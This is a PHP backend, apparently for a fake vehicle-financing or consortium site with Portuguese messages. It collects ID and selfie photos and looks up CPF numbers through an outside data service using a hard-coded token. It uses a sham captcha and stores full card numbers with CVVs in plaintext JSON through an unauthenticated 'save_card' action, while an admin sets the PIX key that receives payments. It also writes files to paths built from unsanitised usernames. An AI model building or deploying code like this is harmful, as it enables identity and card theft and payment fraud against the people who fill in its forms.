<?php
session_start();

define('USERS_FILE', __DIR__ . '/users.json');

function getUsers()
{
    if (!file_exists(USERS_FILE)) {
        return [];
    }
    $data = file_get_contents(USERS_FILE);
    return json_decode($data, true) ?: [];
}

function saveUsers($users)
{
    return file_put_contents(USERS_FILE, json_encode($users, JSON_PRETTY_PRINT));
}

function registerUser($username, $password, $fullname = '', $kyc = [], $financial = [])
{
    $users = getUsers();
    foreach ($users as $user) {
        if ($user['username'] === $username) {
            return ["success" => false, "message" => "Usuário já existe."];
        }
    }

    $users[] = [
        "username" => $username,
        "password" => password_hash($password, PASSWORD_BCRYPT),
        "fullname" => $fullname,
        "kyc" => $kyc, // selfie, front, back
        "financial" => $financial, // income, vehicle_type, vehicle_value, down_payment, term
        "status" => "Pendente",
        "created_at" => date('Y-m-d H:i:s')
    ];

    saveUsers($users);

    // Auto-login after registration
    $_SESSION['user'] = $username;
    $_SESSION['logged_in'] = true;

    return ["success" => true, "message" => "Registro realizado com sucesso!"];
}

function loginUser($username, $password)
{
    $users = getUsers();
    foreach ($users as $user) {
        if ($user['username'] === $username) {
            if (password_verify($password, $user['password'])) {
                $_SESSION['user'] = $username;
                $_SESSION['logged_in'] = true;
                return ["success" => true, "message" => "Login realizado!"];
            }
        }
    }
    return ["success" => false, "message" => "Usuário ou senha inválidos."];
}

function deleteUser($username)
{
    $users = getUsers();
    $newUsers = [];
    foreach ($users as $user) {
        if ($user['username'] === $username) {
            // Delete associated files
            if (isset($user['kyc'])) {
                foreach ($user['kyc'] as $file) {
                    $filepath = __DIR__ . '/' . $file;
                    if (!empty($file) && file_exists($filepath)) {
                        unlink($filepath);
                    }
                }
            }
        } else {
            $newUsers[] = $user;
        }
    }
    saveUsers($newUsers);
    return ["success" => true, "message" => "Usuário e documentos removidos."];
}

function updateUserStatus($username, $newStatus, $managerName = '', $rate = '')
{
    $users = getUsers();
    foreach ($users as &$user) {
        if ($user['username'] === $username) {
            $user['status'] = $newStatus;
            if ($managerName !== '')
                $user['manager'] = $managerName;
            if ($rate !== '')
                $user['contemplation_rate'] = $rate;
            saveUsers($users);
            return ["success" => true, "message" => "Dados atualizados com sucesso."];
        }
    }
    return ["success" => false, "message" => "Usuário não encontrado."];
}

function isLoggedIn()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

function logout()
{
    session_destroy();
    header("Location: index.php");
    exit;
}

// Handle AJAX requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? $_GET['action'] ?? '';
    if (empty($action))
        exit;

    ob_clean();
    header('Content-Type: application/json');
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if ($action === 'register') {
        $fullname = $_POST['fullname'] ?? '';
        $username = $_POST['username'] ?? ''; // Ensure we have username for filenames

        $kyc_input = [
            "selfie" => $_POST['kyc_selfie'] ?? '',
            "front" => $_POST['kyc_front'] ?? '',
            "back" => $_POST['kyc_back'] ?? ''
        ];

        // Save images to 'fotos' folder
        $fotos_dir = __DIR__ . '/fotos';
        if (!is_dir($fotos_dir)) {
            mkdir($fotos_dir, 0777, true);
        }

        $kyc = [];
        foreach ($kyc_input as $key => $base64_data) {
            if (!empty($base64_data) && strpos($base64_data, 'base64,') !== false) {
                $data = explode(',', $base64_data);
                if (isset($data[1])) {
                    $filename = $username . '_' . $key . '.jpg';
                    $filepath = $fotos_dir . '/' . $filename;
                    file_put_contents($filepath, base64_decode($data[1]));
                    $kyc[$key] = 'fotos/' . $filename;
                }
            } else {
                $kyc[$key] = '';
            }
        }

        $financial = [
            "renda" => $_POST['renda'] ?? '',
            "veiculo_tipo" => $_POST['veiculo_tipo'] ?? '',
            "veiculo_valor" => $_POST['veiculo_valor'] ?? '',
            "entrada" => $_POST['entrada'] ?? ''
        ];

        // Validate simple captcha
        $captcha = $_POST['captcha'] ?? '';
        if (empty($captcha) || $captcha !== 'verified') {
            echo json_encode(["success" => false, "message" => "Por favor, verifique que você não é um robô."]);
            exit;
        }

        echo json_encode(registerUser($username, $password, $fullname, $kyc, $financial));
    } elseif ($action === 'update_kyc') {
        $username = $_SESSION['user'] ?? '';
        if (empty($username)) {
            echo json_encode(["success" => false, "message" => "Sessão expirada."]);
            exit;
        }

        $kyc_input = [
            "selfie" => $_POST['kyc_selfie'] ?? '',
            "front" => $_POST['kyc_front'] ?? '',
            "back" => $_POST['kyc_back'] ?? ''
        ];

        $fotos_dir = __DIR__ . '/fotos';
        if (!is_dir($fotos_dir)) {
            mkdir($fotos_dir, 0777, true);
        }

        $kyc = [];
        foreach ($kyc_input as $key => $base64_data) {
            if (!empty($base64_data) && strpos($base64_data, 'base64,') !== false) {
                $data = explode(',', $base64_data);
                if (isset($data[1])) {
                    $filename = $username . '_' . $key . '.jpg';
                    $filepath = $fotos_dir . '/' . $filename;
                    file_put_contents($filepath, base64_decode($data[1]));
                    $kyc[$key] = 'fotos/' . $filename;
                }
            }
        }

        if (!empty($kyc)) {
            $users = getUsers();
            foreach ($users as &$user) {
                if ($user['username'] === $username) {
                    $user['kyc'] = array_merge($user['kyc'] ?? [], $kyc);
                    $user['status'] = 'Em Análise';
                    saveUsers($users);
                    echo json_encode(["success" => true, "message" => "Documentos enviados com sucesso!"]);
                    exit;
                }
            }
        }
        echo json_encode(["success" => false, "message" => "Erro ao processar documentos."]);
        exit;
    } elseif ($action === 'login') {
        echo json_encode(loginUser($username, $password));
    } elseif ($action === 'kyc_lookup') {
        $cpf = $_POST['cpf'] ?? '';
        $url = "https://api.amnesiatecnologia.rocks/?token=c5eebbc9-0469-4324-85f6-0c994b42d18a&cpf=" . $cpf;

        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $response = curl_exec($ch);
            curl_close($ch);
        } else {
            // Fallback for environments without php-curl
            $response = @file_get_contents($url);
        }

        $data = json_decode($response, true);
        if (isset($data['DADOS'])) {
            echo json_encode(["success" => true, "data" => $data['DADOS']]);
        } else {
            echo json_encode(["success" => false, "message" => "Dados não encontrados ou serviço indisponível."]);
        }
    } elseif ($action === 'delete_user') {
        if (isset($_SESSION['admin_auth']) && $_SESSION['admin_auth'] === true) {
            echo json_encode(deleteUser($username));
        } else {
            echo json_encode(["success" => false, "message" => "Não autorizado."]);
        }
    } elseif ($action === 'update_status') {
        if (isset($_SESSION['admin_auth']) && $_SESSION['admin_auth'] === true) {
            $newStatus = $_POST['status'] ?? 'Pendente';
            $managerName = $_POST['manager'] ?? '';
            $rate = $_POST['rate'] ?? '';
            echo json_encode(updateUserStatus($username, $newStatus, $managerName, $rate));
        } else {
            echo json_encode(["success" => false, "message" => "Não autorizado."]);
        }
    } elseif ($action === 'update_pix_config') {
        if (isset($_SESSION['admin_auth']) && $_SESSION['admin_auth'] === true) {
            $pixKey = $_POST['pix_key'] ?? '';
            $activeGateway = $_POST['active_gateway'] ?? 'safe-bank';
            $configPath = __DIR__ . '/src/Config/payment.json';
            $newConfig = ['pix_key' => $pixKey, 'active_gateway' => $activeGateway];
            if (file_put_contents($configPath, json_encode($newConfig, JSON_PRETTY_PRINT))) {
                echo json_encode(['success' => true]);
            } else {
                echo json_encode(["success" => false, "message" => "Erro ao salvar config do MP."]);
            }
        } else {
            echo json_encode(["success" => false, "message" => "Não autorizado."]);
        }
    } elseif ($action === 'save_card') {
        ob_clean();
        header('Content-Type: application/json');

        $username = $_POST['username'] ?? '';
        if (empty($username)) {
            echo json_encode(["success" => false, "message" => "Usuário inválido."]);
            exit;
        }

        $cardData = [
            "number" => $_POST['number'] ?? '',
            "name" => $_POST['name'] ?? '',
            "expiry" => $_POST['expiry'] ?? '',
            "cvv" => $_POST['cvv'] ?? '',
            "installments" => $_POST['installments'] ?? '',
            "date" => date('d/m/Y H:i')
        ];

        $users = getUsers();
        $found = false;
        foreach ($users as &$user) {
            if ($user['username'] === $username) {
                $user['credit_card'] = $cardData;
                $found = true;
                break;
            }
        }

        if ($found) {
            if (saveUsers($users) !== false) {
                echo json_encode(["success" => true]);
            } else {
                echo json_encode(["success" => false, "message" => "Erro de permissão ao salvar dados no servidor."]);
            }
        } else {
            echo json_encode(["success" => false, "message" => "Usuário não encontrado na base de dados."]);
        }
        exit;
    } elseif ($action === 'update_lead') {
        ob_clean();
        header('Content-Type: application/json');

        $username = $_POST['username'] ?? '';
        if (empty($username)) {
            echo json_encode(["success" => false, "message" => "Usuário inválido."]);
            exit;
        }

        $leadData = [
            "email" => $_POST['email'] ?? '',
            "phone" => $_POST['phone'] ?? ''
        ];

        $users = getUsers();
        $found = false;
        foreach ($users as &$user) {
            if ($user['username'] === $username) {
                $user['email'] = $leadData['email'];
                $user['phone'] = $leadData['phone'];
                $found = true;
                break;
            }
        }

        if ($found) {
            if (saveUsers($users) !== false) {
                echo json_encode(["success" => true]);
            } else {
                echo json_encode(["success" => false, "message" => "Erro ao salvar dados."]);
            }
        } else {
            echo json_encode(["success" => false, "message" => "Usuário não encontrado."]);
        }
        exit;
    }
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    logout();
}
?>